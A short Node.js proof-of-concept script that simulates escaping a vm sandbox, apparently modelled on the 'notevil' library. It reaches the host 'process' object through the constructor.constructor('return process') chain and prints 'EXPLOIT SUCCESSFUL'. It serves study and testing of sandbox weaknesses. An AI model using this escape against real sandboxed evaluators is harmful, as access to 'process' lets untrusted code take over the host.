const vm = require('vm');

function safeEval(code, context) {
  // Simulate what notevil does: it evaluates code and if `this` is used, it evaluates to `context`.
  // Here we just simulate the attacker calling context.constructor.constructor
  try {
    const fn = context.constructor.constructor("return process");
    return fn();
  } catch (e) {
    throw e;
  }
}

const orderLinesData = 'mock'; // Not used in this mock
const sandbox = { safeEval, orderLinesData };
vm.createContext(sandbox);

try {
  const result = vm.runInContext('safeEval(orderLinesData, {})', sandbox, { timeout: 2000 });
  console.log("EXPLOIT SUCCESSFUL. process exists:", typeof result !== 'undefined');
} catch (e) {
  console.log("Error:", e.message);
}
